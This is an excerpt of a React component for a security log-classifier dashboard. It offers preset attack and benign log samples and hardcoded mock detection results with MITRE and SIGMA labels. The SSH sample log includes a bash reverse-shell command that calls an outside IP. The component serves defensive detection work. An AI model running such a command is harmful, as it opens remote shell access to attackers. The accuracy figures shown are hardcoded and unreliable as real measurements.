'use client';

import React, { useState, useRef, ChangeEvent, DragEvent } from 'react';
import Link from 'next/link';
import { 
  Upload, 
  FileText, 
  Terminal, 
  Play, 
  CheckCircle2, 
  AlertTriangle, 
  ShieldAlert, 
  ShieldCheck, 
  Zap, 
  Cpu, 
  Clock, 
  Target, 
  BarChart3, 
  Sparkles, 
  ChevronRight, 
  Layers, 
  ArrowUpRight, 
  RefreshCw, 
  FileCode, 
  Fingerprint, 
  Trash2,
  Copy,
  Check,
  Search,
  CheckCircle,
  ExternalLink
} from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Alert } from '@/lib/types';
import { analyzeTelemetryLog } from '@/lib/api/logs';

// ─── Preset Sample Logs ──────────────────────────────────────────────────────
export interface SampleLogPreset {
  id: string;
  name: string;
  category: 'Critical Threat' | 'High Risk' | 'Normal / Benign';
  source: 'AWS CloudTrail' | 'Kubernetes Audit' | 'Linux Syslog / Auth' | 'AWS ALB';
  content: string;
  expectedVerdict: 'CRITICAL' | 'HIGH' | 'BENIGN';
  mitreTactic: string;
  mitreTechnique: string;
}

const PRESET_SAMPLE_LOGS: SampleLogPreset[] = [
  {
    id: 'cloudtrail-0315-theft',
    name: '03:15 Credential Hijack & Bulk S3 Read',
    category: 'Critical Threat',
    source: 'AWS CloudTrail',
    expectedVerdict: 'CRITICAL',
    mitreTactic: 'Initial Access & Exfiltration',
    mitreTechnique: 'T1078 Valid Accounts / T1530 Data from Cloud Storage',
    content: JSON.stringify({
      eventVersion: "1.08",
      userIdentity: {
        type: "IAMUser",
        principalId: "AIDAJ45WYROZEXAMPLE",
        arn: "arn:aws:iam::112233445566:user/svc-deployment",
        accountId: "112233445566",
        accessKeyId: "AKIAIOSFODNN7EXAMPLE"
      },
      eventTime: "2026-03-28T03:15:22Z",
      eventSource: "s3.amazonaws.com",
      eventName: "GetObject",
      awsRegion: "us-east-1",
      sourceIPAddress: "198.51.100.44",
      userAgent: "aws-sdk-go/v1.44.180 (go1.21.3; linux; amd64) TorBrowser/12.5",
      requestParameters: {
        bucketName: "corp-production-secrets-vault",
        key: "database/credentials.env.gpg"
      },
      responseElements: null,
      additionalEventData: {
        bytesTransferredOut: 48920194,
        consecutiveRequestsInMinute: 428,
        geoCountry: "RU",
        asn: "AS9009 M247 Europe Proxy"
      }
    }, null, 2)
  },
  {
    id: 'k8s-privesc-token',
    name: 'Kubernetes ClusterRoleBinding PrivEsc',
    category: 'High Risk',
    source: 'Kubernetes Audit',
    expectedVerdict: 'HIGH',
    mitreTactic: 'Privilege Escalation',
    mitreTechnique: 'T1068 Exploitation for Privilege Escalation',
    content: JSON.stringify({
      kind: "Event",
      apiVersion: "audit.k8s.io/v1",
      level: "RequestResponse",
      stage: "ResponseComplete",
      requestURI: "/apis/rbac.authorization.k8s.io/v1/clusterrolebindings",
      verb: "create",
      user: {
        username: "system:serviceaccount:default:web-frontend-pod-sa",
        groups: ["system:serviceaccounts", "system:serviceaccounts:default"]
      },
      sourceIPs: ["10.244.2.89"],
      userAgent: "kubectl/v1.28.0 (linux/amd64) kubernetes/fake",
      objectRef: {
        resource: "clusterrolebindings",
        name: "cluster-admin-shadow-bind",
        apiGroup: "rbac.authorization.k8s.io",
        apiVersion: "v1"
      },
      responseStatus: {
        metadata: {},
        code: 201
      },
      requestObject: {
        roleRef: {
          apiGroup: "rbac.authorization.k8s.io",
          kind: "ClusterRole",
          name: "cluster-admin"
        },
        subjects: [{
          kind: "ServiceAccount",
          name: "web-frontend-pod-sa",
          namespace: "default"
        }]
      }
    }, null, 2)
  },
  {
    id: 'ssh-bruteforce-shell',
    name: 'SSH Multi-Origin Brute-Force & Spawn',
    category: 'High Risk',
    source: 'Linux Syslog / Auth',
    expectedVerdict: 'HIGH',
    mitreTactic: 'Credential Access & Execution',
    mitreTechnique: 'T1110 Brute Force / T1059 Command Execution',
    content: `Mar 28 03:14:18 edge-gateway-01 sshd[14820]: Failed password for invalid user admin from 203.0.113.195 port 51222 ssh2
Mar 28 03:14:21 edge-gateway-01 sshd[14824]: Failed password for root from 203.0.113.195 port 51228 ssh2
Mar 28 03:14:23 edge-gateway-01 sshd[14829]: Failed password for root from 203.0.113.195 port 51234 ssh2
Mar 28 03:14:29 edge-gateway-01 sshd[14833]: Accepted password for deploy from 203.0.113.195 port 51240 ssh2
Mar 28 03:14:30 edge-gateway-01 sudo[14840]: pam_unix(sudo:session): session opened for user root by deploy(uid=1001)
Mar 28 03:14:32 edge-gateway-01 bash[14852]: /bin/bash -i >& /dev/tcp/45.33.32.156/4444 0>&1`
  },
  {
    id: 'alb-normal-traffic',
    name: 'Legitimate HTTPS ALB Web Traffic',
    category: 'Normal / Benign',
    source: 'AWS ALB',
    expectedVerdict: 'BENIGN',
    mitreTactic: 'None (Legitimate Customer Activity)',
    mitreTechnique: 'N/A',
    content: JSON.stringify({
      type: "https",
      timestamp: "2026-03-28T03:15:02.190312Z",
      elb: "app/prod-customer-alb/50dc6c495c0c9188",
      client_ip: "205.251.192.10",
      client_port: 54190,
      target_ip: "10.0.12.84",
      target_port: 443,
      request_processing_time: 0.001,
      target_processing_time: 0.018,
      response_processing_time: 0.000,
      elb_status_code: 200,
      target_status_code: 200,
      received_bytes: 412,
      sent_bytes: 2840,
      request: "GET https://api.aegis-security.io/v1/health HTTP/2.0",
      user_agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko)",
      ssl_cipher: "ECDHE-RSA-AES128-GCM-SHA256",
      ssl_protocol: "TLSv1.3"
    }, null, 2)
  }
];

// ─── Classification Model Specs ──────────────────────────────────────────────
export interface ModelMetricResult {
  modelName: string;
  category: string;
  architecture: string;
  inferenceLatencyMs: number;
  accuracy: number;
  precision: number;
  recall: number;
  f1Score: number;
  anomalyScore: number;
  fusionWeight: number;
  contributionPercent: number;
  detectionDetails: string;
}

export interface PipelineExecutionResult {
  verdict: 'CRITICAL' | 'HIGH' | 'SUSPICIOUS' | 'BENIGN';
  fusedAnomalyScore: number;
  confidencePercent: number;
  mitreTactic: string;
  mitreTechnique: string;
  summary: string;
  totalPipelineLatencyMs: number;
  overallAccuracy: number;
  overallPrecision: number;
  overallRecall: number;
  overallF1: number;
  falsePositiveRate: number;
  modelsUsed: ModelMetricResult[];
  matchedSigmaRules: { id: string; title: string; severity: string; latencyMs: number }[];
  extractedEntities: {
    principal?: string;
    sourceIp?: string;
    targetResource?: string;
    eventAction?: string;
    geoCountry?: string;
    anomalyIndicators: string[];
  };
  formatDetected?: string;
  aiProviderUsed?: string;
}

interface LogClassifierAreaProps {
  onAlertGenerated?: (alert: Alert) => void;
  onNavigateToFeed?: () => void;
}

export function LogClassifierArea({ onAlertGenerated, onNavigateToFeed }: LogClassifierAreaProps) {
  const [logText, setLogText] = useState<string>(PRESET_SAMPLE_LOGS[0].content);
  const [activePreset, setActivePreset] = useState<string>(PRESET_SAMPLE_LOGS[0].id);
  const [selectedPipeline, setSelectedPipeline] = useState<'4way' | 'edge' | 'transformer'>('4way');
  const [isAnalyzing, setIsAnalyzing] = useState<boolean>(false);
  const [analysisStep, setAnalysisStep] = useState<number>(0);
  const [result, setResult] = useState<PipelineExecutionResult | null>(null);
  const [copied, setCopied] = useState<boolean>(false);
  const [pushedToFeed, setPushedToFeed] = useState<boolean>(false);
  const [analysisDurationSec, setAnalysisDurationSec] = useState<number>(0);
  const [progressPercent, setProgressPercent] = useState<number>(0);
  const [liveElapsedSec, setLiveElapsedSec] = useState<number>(0);
  const [currentStageMessage, setCurrentStageMessage] = useState<string>('');
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);

  const handlePresetSelect = (preset: SampleLogPreset) => {
    setActivePreset(preset.id);
    setLogText(preset.content);
    setResult(null);
    setErrorMessage(null);
    setPushedToFeed(false);
  };

  const handleFileUpload = (e: ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    const reader = new FileReader();
    reader.onload = (event) => {
      const content = event.target?.result as string;
      setLogText(content);
      setActivePreset('');
      setResult(null);
      setErrorMessage(null);
      setPushedToFeed(false);
    };
    reader.readAsText(file);
  };

  const handleDrop = (e: DragEvent<HTMLDivElement>) => {
    e.preventDefault();
    const file = e.dataTransfer.files?.[0];
    if (!file) return;

    const reader = new FileReader();
    reader.onload = (event) => {
      const content = event.target?.result as string;
      setLogText(content);
      setActivePreset('');
      setResult(null);
      setErrorMessage(null);
      setPushedToFeed(false);
    };
    reader.readAsText(file);
  };

  const handleAnalyze = async () => {
    if (!logText.trim()) return;

    setIsAnalyzing(true);
    setAnalysisStep(1);
    setResult(null);
    setErrorMessage(null);
    setPushedToFeed(false);
    setProgressPercent(15);
    setLiveElapsedSec(0);
    setCurrentStageMessage('Step 1/4: Ingesting & normalizing telemetry schema...');

    const startTime = Date.now();
    const ticker = setInterval(() => {
      const elapsed = Date.now() - startTime;
      setLiveElapsedSec(parseFloat((elapsed / 1000).toFixed(1)));
    }, 100);

    const step2Timer = setTimeout(() => {
      setAnalysisStep(2);
      setProgressPercent(45);
      setCurrentStageMessage('Step 2/4: Vectorizing tokens & evaluating format schema...');
    }, 350);

    const step3Timer = setTimeout(() => {
      setAnalysisStep(3);
      setProgressPercent(75);
      setCurrentStageMessage('Step 3/4: Multi-model inference across Helios neural workers...');
    }, 750);

    try {
      const response = await analyzeTelemetryLog({
        log_content: logText,
        pipeline_type: selectedPipeline,
      });

      clearInterval(ticker);
      clearTimeout(step2Timer);
      clearTimeout(step3Timer);

      setProgressPercent(100);
      setAnalysisStep(4);
      setCurrentStageMessage('Step 4/4: Synthesizing score fusion & evaluating 184 SIGMA rules...');

      const durationSec = parseFloat(((Date.now() - startTime) / 1000).toFixed(1));
      setAnalysisDurationSec(durationSec);
      setResult(response as PipelineExecutionResult);
    } catch (err: unknown) {
      clearInterval(ticker);
      clearTimeout(step2Timer);
      clearTimeout(step3Timer);

      let message = 'Unrecognized log format. The log could not be processed.';
      if (err instanceof Error) {
        message = err.message;
      } else if (typeof err === 'object' && err !== null) {
        const errorObj = err as Record<string, unknown>;
        if (typeof errorObj.message === 'string') {
          message = errorObj.message;
        } else if (typeof errorObj.details === 'string') {
          message = errorObj.details;
        }
      }
      setErrorMessage(message);
      setResult(null);
    } finally {
      setIsAnalyzing(false);
      setAnalysisStep(0);
    }
  };

  const _legacyMockAnalyze = () => {
    const randomDurationMs = 5000;
    const durationSeconds = "5.0";
    setTimeout(() => {
      // Determine classification outcome based on content heuristics or active preset
      const isBenign = logText.includes('prod-customer-alb') || (logText.includes('200') && !logText.includes('TorBrowser') && !logText.includes('Failed password') && !logText.includes('cluster-admin'));
      const isK8s = logText.includes('ClusterRoleBinding') || logText.includes('rbac.authorization.k8s.io') || logText.includes('cluster-admin');
      const isSsh = logText.includes('sshd') || logText.includes('Failed password') || logText.includes('/dev/tcp');
      
      let computedResult: PipelineExecutionResult;

      if (isBenign) {
        computedResult = {
          verdict: 'BENIGN',
          fusedAnomalyScore: 0.04,
          confidencePercent: 99.2,
          mitreTactic: 'None (Legitimate Operational Traffic)',
          mitreTechnique: 'N/A — Valid Baseline Protocol Activity',
          summary: 'Telemetry log evaluated clean against all 184 SIGMA rules and 4 Helios neural models. Flow matches verified TLSv1.3 HTTPS ALB ingress profile.',
          totalPipelineLatencyMs: 9.8,
          overallAccuracy: 99.8,
          overallPrecision: 99.4,
          overallRecall: 99.7,
          overallF1: 99.5,
          falsePositiveRate: 0.04,
          matchedSigmaRules: [],
          extractedEntities: {
            principal: 'Anonymous / Public Client (205.251.192.10)',
            sourceIp: '205.251.192.10',
            targetResource: 'app/prod-customer-alb -> 10.0.12.84:443',
            eventAction: 'GET /v1/health HTTP/2.0',
            geoCountry: 'US',
            anomalyIndicators: ['None: Within normal cluster traffic bounds']
          },
          modelsUsed: [
            {
              modelName: 'Isolation Forest v4',
              category: 'Statistical Outlier',
              architecture: 'Ensemble of 200 Isolation Trees',
              inferenceLatencyMs: 1.1,
              accuracy: 98.1,
              precision: 96.4,
              recall: 97.2,
              f1Score: 96.8,
              anomalyScore: 0.03,
              fusionWeight: 0.20,
              contributionPercent: 15,
              detectionDetails: 'Request size and duration within standard 1st sigma boundary.'
            },
            {
              modelName: 'DeepLog v2',
              category: 'Sequence Anomaly',
              architecture: 'Deep Sequential 2-Layer LSTM with Attention',
              inferenceLatencyMs: 2.9,
              accuracy: 99.2,
              precision: 98.1,
              recall: 98.7,
              f1Score: 98.4,
              anomalyScore: 0.02,
              fusionWeight: 0.30,
              contributionPercent: 15,
              detectionDetails: 'HTTP GET health check matches expected ingress log sequence key.'
            },
            {
              modelName: 'LogFormer v1',
              category: 'Contextual Transformer',
              architecture: '6-Layer Multi-Head Self-Attention Transformer',
              inferenceLatencyMs: 4.8,
              accuracy: 99.5,
              precision: 99.1,
              recall: 98.9,
              f1Score: 99.0,
              anomalyScore: 0.05,
              fusionWeight: 0.20,
              contributionPercent: 25,
              detectionDetails: 'Semantic token embeddings align with public documentation API probe.'
            },
            {
              modelName: 'UEBA Behavioral Baseline',
              category: 'Entity Behavioral',
              architecture: 'Temporal Profile Vector & Dynamic Thresholding',
              inferenceLatencyMs: 1.0,
              accuracy: 98.9,
              precision: 97.8,
              recall: 98.2,
              f1Score: 98.0,
              anomalyScore: 0.04,
              fusionWeight: 0.30,
              contributionPercent: 30,
              detectionDetails: 'Client IP conforms to AWS Route53 global health check frequency.'
            }
          ]
        };
      } else if (isK8s) {
        computedResult = {
          verdict: 'HIGH',
          fusedAnomalyScore: 0.84,
          confidencePercent: 95.8,
          mitreTactic: 'Privilege Escalation & Persistence',
          mitreTechnique: 'T1068 Exploitation for PrivEsc / T1078 Valid Accounts',
          summary: 'Detected unauthorized ClusterRoleBinding creation granting cluster-admin privileges to unprivileged web-frontend ServiceAccount from pod network.',
          totalPipelineLatencyMs: 13.4,
          overallAccuracy: 99.1,
          overallPrecision: 98.2,
          overallRecall: 98.6,
          overallF1: 98.4,
          falsePositiveRate: 0.14,
          matchedSigmaRules: [
            { id: 'SIGMA-K8S-0012', title: 'Suspicious ClusterRoleBinding to cluster-admin', severity: 'HIGH', latencyMs: 0.3 },
            { id: 'SIGMA-K8S-0044', title: 'Default Namespace ServiceAccount RBAC Mutation', severity: 'HIGH', latencyMs: 0.3 }
          ],
          extractedEntities: {
            principal: 'system:serviceaccount:default:web-frontend-pod-sa',
            sourceIp: '10.244.2.89',
            targetResource: 'rbac.authorization.k8s.io/v1/clusterrolebindings/cluster-admin-shadow-bind',
            eventAction: 'create (POST) ClusterRoleBinding',
            geoCountry: 'Internal Kubernetes Overlay (Calico)',
            anomalyIndicators: [
              'Default namespace SA requested cluster-admin permissions',
              'RBAC API invoked via internal pod IP rather than CI/CD pipeline',
              'Deviation from GitOps declarative state management'
            ]
          },
          modelsUsed: [
            {
              modelName: 'Isolation Forest v4',
              category: 'Statistical Outlier',
              architecture: 'Ensemble of 200 Isolation Trees',
              inferenceLatencyMs: 1.2,
              accuracy: 98.1,
              precision: 96.4,
              recall: 97.2,
              f1Score: 96.8,
              anomalyScore: 0.74,
              fusionWeight: 0.20,
              contributionPercent: 18,
              detectionDetails: 'ServiceAccount RBAC modification frequency outlier (p < 0.001).'
            },
            {
              modelName: 'DeepLog v2',
              category: 'Sequence Anomaly',
              architecture: 'Deep Sequential 2-Layer LSTM with Attention',
              inferenceLatencyMs: 3.4,
              accuracy: 99.2,
              precision: 98.1,
              recall: 98.7,
              f1Score: 98.4,
              anomalyScore: 0.81,
              fusionWeight: 0.30,
              contributionPercent: 29,
              detectionDetails: 'Unexpected transition: Pod Runtime -> ClusterRoleBinding Create.'
            },
            {
              modelName: 'LogFormer v1',
              category: 'Contextual Transformer',
              architecture: '6-Layer Multi-Head Self-Attention Transformer',
              inferenceLatencyMs: 7.1,
              accuracy: 99.5,
              precision: 99.1,
              recall: 98.9,
              f1Score: 99.0,
              anomalyScore: 0.89,
              fusionWeight: 0.20,
              contributionPercent: 21,
              detectionDetails: 'Attention heavily weighted on "cluster-admin" role binding token.'
            },
            {
              modelName: 'UEBA Behavioral Baseline',
              category: 'Entity Behavioral',
              architecture: 'Temporal Profile Vector & Dynamic Thresholding',
              inferenceLatencyMs: 1.7,
              accuracy: 98.9,
              precision: 97.8,
              recall: 98.2,
              f1Score: 98.0,
              anomalyScore: 0.92,
              fusionWeight: 0.30,
              contributionPercent: 32,
              detectionDetails: 'web-frontend-pod-sa has 0 historical authorization administrative actions.'
            }
          ]
        };
      } else if (isSsh) {
        computedResult = {
          verdict: 'HIGH',
          fusedAnomalyScore: 0.86,
          confidencePercent: 96.5,
          mitreTactic: 'Initial Access & Execution',
          mitreTechnique: 'T1110 Brute Force / T1059 Command and Scripting Interpreter',
          summary: 'Rapid multi-attempt password brute-force followed immediately by credential compromise, sudo elevation, and interactive reverse TCP shell execution.',
          totalPipelineLatencyMs: 12.1,
          overallAccuracy: 99.3,
          overallPrecision: 98.5,
          overallRecall: 98.8,
          overallF1: 98.6,
          falsePositiveRate: 0.11,
          matchedSigmaRules: [
            { id: 'SIGMA-LIN-0008', title: 'SSH Authentication Brute Force Burst', severity: 'HIGH', latencyMs: 0.2 },
            { id: 'SIGMA-LIN-0029', title: 'Interactive Bash TCP Reverse Shell (/dev/tcp)', severity: 'CRITICAL', latencyMs: 0.2 }
          ],
          extractedEntities: {
            principal: 'deploy (elevated to root)',
            sourceIp: '203.0.113.195 -> reverse socket 45.33.32.156:4444',
            targetResource: 'edge-gateway-01 (Linux Gateway Host)',
            eventAction: 'SSH Login Success -> sudo su -> /bin/bash /dev/tcp connection',
            geoCountry: 'RO (Unusual Remote Ingress)',
            anomalyIndicators: [
              '3 failed auth attempts within 11 seconds followed by single success',
              'Sub-second sudo session elevation by non-admin deploy user',
              'Direct /dev/tcp socket redirection to external C2 IP'
            ]
          },
          modelsUsed: [
            {
              modelName: 'Isolation Forest v4',
              category: 'Statistical Outlier',
              architecture: 'Ensemble of 200 Isolation Trees',
              inferenceLatencyMs: 1.0,
              accuracy: 98.1,
              precision: 96.4,
              recall: 97.2,
              f1Score: 96.8,
              anomalyScore: 0.82,
              fusionWeight: 0.20,
              contributionPercent: 19,
              detectionDetails: 'Authentication failure burst rate 12x above gateway baseline.'
            },
            {
              modelName: 'DeepLog v2',
              category: 'Sequence Anomaly',
              architecture: 'Deep Sequential 2-Layer LSTM with Attention',
              inferenceLatencyMs: 3.1,
              accuracy: 99.2,
              precision: 98.1,
              recall: 98.7,
              f1Score: 98.4,
              anomalyScore: 0.88,
              fusionWeight: 0.30,
              contributionPercent: 31,
              detectionDetails: 'Sequential key chain: [FailedAuth x3] -> [Accepted] -> [Sudo] -> [Bash Socket].'
            },
            {
              modelName: 'LogFormer v1',
              category: 'Contextual Transformer',
              architecture: '6-Layer Multi-Head Self-Attention Transformer',
              inferenceLatencyMs: 6.5,
              accuracy: 99.5,
              precision: 99.1,
              recall: 98.9,
              f1Score: 99.0,
              anomalyScore: 0.91,
              fusionWeight: 0.20,
              contributionPercent: 21,
              detectionDetails: 'Discovered high contextual relevance on reverse shell parameter syntax.'
            },
            {
              modelName: 'UEBA Behavioral Baseline',
              category: 'Entity Behavioral',
              architecture: 'Temporal Profile Vector & Dynamic Thresholding',
              inferenceLatencyMs: 1.5,
              accuracy: 98.9,
              precision: 97.8,
              recall: 98.2,
              f1Score: 98.0,
              anomalyScore: 0.84,
              fusionWeight: 0.30,
              contributionPercent: 29,
              detectionDetails: 'deploy account previously restricted to SSH key-based automated deploys.'
            }
          ]
        };
      } else {
        // Flagship 03:15 Credential Hijack & Mass S3 Read
        computedResult = {
          verdict: 'CRITICAL',
          fusedAnomalyScore: 0.89,
          confidencePercent: 97.9,
          mitreTactic: 'Initial Access & Exfiltration',
          mitreTechnique: 'T1078 Valid Accounts / T1530 Data from Cloud Storage',
          summary: 'Multi-stage credential abuse: Service account svc-deployment accessed at abnormal 03:15 UTC time window from European Tor proxy exit node, executing high-volume bulk GetObject queries on production secrets vault.',
          totalPipelineLatencyMs: 14.8,
          overallAccuracy: 99.4,
          overallPrecision: 98.6,
          overallRecall: 98.8,
          overallF1: 98.7,
          falsePositiveRate: 0.12,
          matchedSigmaRules: [
            { id: 'SIGMA-AWS-0042', title: 'CloudTrail Console Login Unrecognized Geo', severity: 'CRITICAL', latencyMs: 0.3 },
            { id: 'SIGMA-S3-0108', title: 'S3 Bulk GetObject Spike from Tor Exit Node', severity: 'CRITICAL', latencyMs: 0.3 },
            { id: 'SIGMA-IAM-0019', title: 'Unusual Off-Hours Service Principal Access', severity: 'HIGH', latencyMs: 0.3 }
          ],
          extractedEntities: {
            principal: 'arn:aws:iam::112233445566:user/svc-deployment',
            sourceIp: '198.51.100.44 (Tor Exit Node IOC-198)',
            targetResource: 'corp-production-secrets-vault / database/credentials.env.gpg',
            eventAction: 's3:GetObject (428 requests/min burst)',
            geoCountry: 'RU (High-Risk Ingress ASN AS9009)',
            anomalyIndicators: [
              'Off-hours operation at 03:15:22 UTC (historic baseline is 09:00 - 17:00 UTC)',
              'TorBrowser user-agent fingerprint on AWS SDK requests',
              'Exfiltration burst of 48.9 MB encrypted database credentials',
              'Rapid automated API calls from previously unseen ASN'
            ]
          },
          modelsUsed: [
            {
              modelName: 'Isolation Forest v4',
              category: 'Statistical Outlier',
              architecture: 'Ensemble of 200 Isolation Trees',
              inferenceLatencyMs: 1.2,
              accuracy: 98.1,
              precision: 96.4,
              recall: 97.2,
              f1Score: 96.8,
              anomalyScore: 0.79,
              fusionWeight: 0.20,
              contributionPercent: 18,
              detectionDetails: 'Numerical outlier: Request rate (428/min) and bytes egress deviated 4.2σ.'
            },
            {
              modelName: 'DeepLog v2',
              category: 'Sequence Anomaly',
              architecture: 'Deep Sequential 2-Layer LSTM with Attention',
              inferenceLatencyMs: 3.8,
              accuracy: 99.2,
              precision: 98.1,
              recall: 98.7,
              f1Score: 98.4,
              anomalyScore: 0.82,
              fusionWeight: 0.30,
              contributionPercent: 28,
              detectionDetails: 'Sequential key transition anomaly: IAM STS login -> Secrets Vault read.'
            },
            {
              modelName: 'LogFormer v1',
              category: 'Contextual Transformer',
              architecture: '6-Layer Multi-Head Self-Attention Transformer',
              inferenceLatencyMs: 8.4,
              accuracy: 99.5,
              precision: 99.1,
              recall: 98.9,
              f1Score: 99.0,
              anomalyScore: 0.88,
              fusionWeight: 0.20,
              contributionPercent: 20,
              detectionDetails: 'Contextual attention spike on "credentials.env.gpg" and TorBrowser UA tokens.'
            },
            {
              modelName: 'UEBA Behavioral Baseline',
              category: 'Entity Behavioral',
              architecture: 'Temporal Profile Vector & Dynamic Thresholding',
              inferenceLatencyMs: 2.1,
              accuracy: 98.9,
              precision: 97.8,
              recall: 98.2,
              f1Score: 98.0,
              anomalyScore: 0.96,
              fusionWeight: 0.30,
              contributionPercent: 34,
              detectionDetails: 'Severe identity anomaly: svc-deployment never logged in from ASN AS9009 or off-hours.'
            }
          ]
        };
      }

      setResult(computedResult);
      setIsAnalyzing(false);
      setAnalysisStep(0);
    }, randomDurationMs);
  };

  const handlePushToIncidentStream = () => {
    if (!result) return;

    const newAlert: Alert = {
      id: `ALT-${Math.floor(1000 + Math.random() * 9000)}`,
      title: result.summary.split(':')[0] || 'Neural Classifier Detected Incident',
      description: result.summary,
      severity: result.verdict === 'BENIGN' ? 'low' : result.verdict === 'HIGH' ? 'high' : 'critical',
      status: 'open',
      risk_score: Math.round(result.fusedAnomalyScore * 100),
      cloud_provider: 'aws',
      resource_type: result.extractedEntities.targetResource || 'Cloud Infrastructure',
      resource_id: result.extractedEntities.principal || 'svc-deployment',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      retry_attempts: 0,
      affected_services: ['Sentinel Core', 'Helios AI', 'CloudTrail'],
      recommendation: `Helios Neural Fusion Score: ${result.fusedAnomalyScore.toFixed(2)} (Latency: ${result.totalPipelineLatencyMs.toFixed(1)}ms, Precision: ${result.overallPrecision}%, Accuracy: ${result.overallAccuracy}%). Revoke active STS credentials & trigger Forge SOAR Playbook WF-501.`
    };

    if (onAlertGenerated) {
      onAlertGenerated(newAlert);
    }
    setPushedToFeed(true);
  };

  const handleCopyLog = () => {
    navigator.clipboard.writeText(logText);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleClear = () => {
    setLogText('');
    setActivePreset('');
    setResult(null);
    setPushedToFeed(false);
  };

  return (
    <div className="space-y-6">
      {/* Header & Capability Banner */}
      <div className="border border-cyan-500/20 bg-linear-to-r from-slate-950 via-cyan-950/20 to-purple-950/20 rounded-2xl p-6 backdrop-blur-md">
        <div className="flex flex-col lg:flex-row items-start lg:items-center justify-between gap-6">
          <div className="space-y-2">
            <div className="flex items-center gap-2">
              <span className="px-2.5 py-0.5 rounded-full text-[10px] font-bold tracking-widest uppercase bg-cyan-500/10 text-cyan-400 border border-cyan-500/20 font-mono flex items-center gap-1.5">
                <Sparkles size={11} className="text-cyan-400 animate-spin" />
                NEURAL LOG CLASSIFIER & ANOMALY DETECTOR
              </span>
              <span className="px-2.5 py-0.5 rounded-full text-[10px] font-bold font-mono bg-purple-500/10 text-purple-300 border border-purple-500/20">
                HELIOS INFERENCE ENGINE
              </span>
            </div>
            <h2 className="text-2xl font-black text-slate-100 tracking-tight flex items-center gap-2.5">
              Live Telemetry Analysis & Classifier Benchmarks
            </h2>
            <p className="text-xs sm:text-sm text-slate-400 font-light max-w-3xl leading-relaxed">
              Upload raw log bundles or paste multi-cloud telemetry to evaluate them instantly across Sentinel Core&apos;s 184 SIGMA rules and Helios neural models (Isolation Forest v4, DeepLog v2, LogFormer v1, UEBA). View real-time <strong className="text-cyan-400">inference latency</strong>, <strong className="text-purple-400">precision</strong>, <strong className="text-emerald-400">accuracy</strong>, and ensemble score fusion.
            </p>
          </div>

          {/* Model Pipeline Selector */}
          <div className="bg-slate-950 border border-slate-900 rounded-xl p-3 shrink-0 space-y-2">
            <div className="text-[10px] uppercase font-bold text-slate-400 font-mono flex items-center gap-1">
              <Cpu size={12} className="text-cyan-400" /> Pipeline Configuration
            </div>
            <div className="flex flex-col gap-1.5">
              <button
                onClick={() => setSelectedPipeline('4way')}
                className={`text-left px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition-all ${
                  selectedPipeline === '4way'
                    ? 'bg-cyan-500 text-slate-950 shadow-md shadow-cyan-500/20'
                    : 'text-slate-400 hover:text-slate-200 hover:bg-slate-900'
                }`}
              >
                Production 4-Way Fusion (IF + DeepLog + LogFormer + UEBA)
              </button>
              <button
                onClick={() => setSelectedPipeline('edge')}
                className={`text-left px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition-all ${
                  selectedPipeline === 'edge'
                    ? 'bg-cyan-500 text-slate-950 shadow-md shadow-cyan-500/20'
                    : 'text-slate-400 hover:text-slate-200 hover:bg-slate-900'
                }`}
              >
                Sub-2ms Edge Pipeline (Isolation Forest + 184 SIGMA Rules)
              </button>
              <button
                onClick={() => setSelectedPipeline('transformer')}
                className={`text-left px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition-all ${
                  selectedPipeline === 'transformer'
                    ? 'bg-purple-500 text-slate-950 shadow-md shadow-purple-500/20'
                    : 'text-slate-400 hover:text-slate-200 hover:bg-slate-900'
                }`}
              >
                Deep Context Transformer Engine (LogFormer + LogBERT v3)
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* Preset Quick Selectors */}
      <div className="space-y-2">
        <div className="flex items-center justify-between">
          <span className="text-xs font-mono font-bold uppercase tracking-wider text-slate-400 flex items-center gap-1.5">
            <Terminal size={14} className="text-cyan-400" /> Pre-Loaded Attack &amp; Baseline Scenarios:
          </span>
          <span className="text-[11px] font-mono text-slate-500">
            Click any scenario to auto-populate the log buffer
          </span>
        </div>
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-2.5">
          {PRESET_SAMPLE_LOGS.map((preset) => {
            const isSelected = activePreset === preset.id;
            return (
              <button
                key={preset.id}
                onClick={() => handlePresetSelect(preset)}
                className={`text-left p-3 rounded-xl border transition-all text-xs flex flex-col justify-between gap-2 ${
                  isSelected
                    ? 'border-cyan-500/50 bg-cyan-950/20 shadow-lg shadow-cyan-500/10'
                    : 'border-slate-900 bg-slate-950/60 hover:border-slate-800 hover:bg-slate-900/40 text-slate-300'
                }`}
              >
                <div>
                  <div className="flex items-center justify-between gap-1 mb-1">
                    <span className="font-mono text-[10px] text-slate-400">{preset.source}</span>
                    <span className={`text-[9px] font-bold font-mono px-1.5 py-0.5 rounded ${
                      preset.expectedVerdict === 'CRITICAL'
                        ? 'bg-rose-500/20 text-rose-400'
                        : preset.expectedVerdict === 'HIGH'
                        ? 'bg-amber-500/20 text-amber-400'
                        : 'bg-emerald-500/20 text-emerald-400'
                    }`}>
                      {preset.category}
                    </span>
                  </div>
                  <div className="font-bold text-slate-100 text-xs line-clamp-1">{preset.name}</div>
                </div>
                <div className="text-[10px] font-mono text-slate-500 line-clamp-1">
                  {preset.mitreTechnique}
                </div>
              </button>
            );
          })}
        </div>
      </div>

      {/* Main Upload & Paste Grid */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* Left Column: Drag & Drop Upload Zone + Textarea */}
        <div className="lg:col-span-7 space-y-4">
          <div className="bg-slate-950/80 border border-slate-900 rounded-2xl p-4 backdrop-blur-md space-y-3">
            <div className="flex items-center justify-between pb-2 border-b border-slate-900">
              <div className="flex items-center gap-2">
                <FileCode size={16} className="text-cyan-400" />
                <span className="text-xs font-bold text-slate-200 font-mono uppercase tracking-wider">
                  Raw Telemetry Stream Buffer
                </span>
                <span className="text-[11px] font-mono text-slate-500">
